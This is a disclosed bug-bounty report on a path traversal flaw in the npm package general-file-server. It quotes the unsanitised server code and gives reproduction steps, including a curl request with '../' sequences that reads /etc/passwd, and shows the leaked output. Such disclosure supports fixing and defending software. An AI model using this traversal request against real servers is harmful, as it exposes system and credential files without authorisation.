@@ -1,0 +1,137 @@
+ReportLink:https://hackerone.com/reports/310943
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/bl4de
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:10.03.2018 14:31:20
+
+Summary:
+
+Hi Guys,
+
+There is Path Traversal in general-file-server module.
+It allows to read content of arbitrary files on the remote server.
+
+## Module
+
+**general-file-server**
+
+This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.
+
+https://www.npmjs.com/package/general-file-server
+
+version: 1.1.8
+
+Stats
+1 download in the last day
+17 downloads in the last week
+67 downloads in the last month
+
+~750 estimated downloads per year
+
+
+## Description
+
+Lack of file path sanitization causes that any file on the server might be read by malicious user, despite the fact that there is ```root_path``` setting in module's ```config.js``` file:
+
+```javascript
+// sample config.js
+module.exports = {
+    hostname: '127.0.0.1',
+    port: 8080,
+    root_path: "./",
+    title: "General File Server",
+    logo_link: "/____statics/logo.png"
+}
+```
+
+Here's the code which causes issue:
+
+```javascript
+// node_modules/general-file-server/server.js, line 77
+if (pathname.search('____statics') == 1) {
+        currpath = __dirname + pathname
+
+        fs.stat(currpath, function (err, stat) {
+            if (err || stat.isDirectory()) {
+                endupwith404(res)
+            } else {
+                res.writeHeader(200, {
+                    'Content-Type': mime.lookup(currpath)
+                })
+                fs.createReadStream(currpath).pipe(res)
+            }
+        })
+    }
+```
+
+As you can see, ```currpath``` is passed to ```fs.createFileStream()``` and piped directly into Response object withou any sanitization against Path Traversal.
+
+
+## Steps To Reproduce:
+
+
+- install ```general-file-server```:
+
+```
+$ npm install general-file-server
+```
+
+- run ```general-file-server``` in direcotry of your choice. It will use settings from ```config.js``` file:
+
+```
+me:~/playground/hackerone/Node$ ./node_modules/general-file-server/server.js
+> serving "./" http://127.0.0.1:8080
+```
+
+- execute following ```curl``` command (adjust number of ../ to reflect your system):
+
+```
+$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
+```
+
+- see result:
+
+```
+*   Trying 127.0.0.1...
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+> GET /../../../../../../etc/passwd HTTP/1.1
+> Host: 127.0.0.1:8080
+> User-Agent: curl/7.47.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Content-Type: application/octet-stream
+< Date: Wed, 31 Jan 2018 12:53:13 GMT
+< Connection: keep-alive
+< Transfer-Encoding: chunked
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+(...)
+```
+
+## Supporting Material/References:
+
+
+- Ubuntu 16.04 LTS
+- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
+- Node.js version: v8.9.4 LTS
+- npm version: 5.6.0
+- curl 7.47.0
+
+
+Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.
+
+I hope my report will help to keep Node.js ecosystem and its users safe in the future.
+
+Regards,
+
+Rafal 'bl4de' Janicki
+
+## Impact
+
+This vulnerability allows malicious user to read content of any file on the server
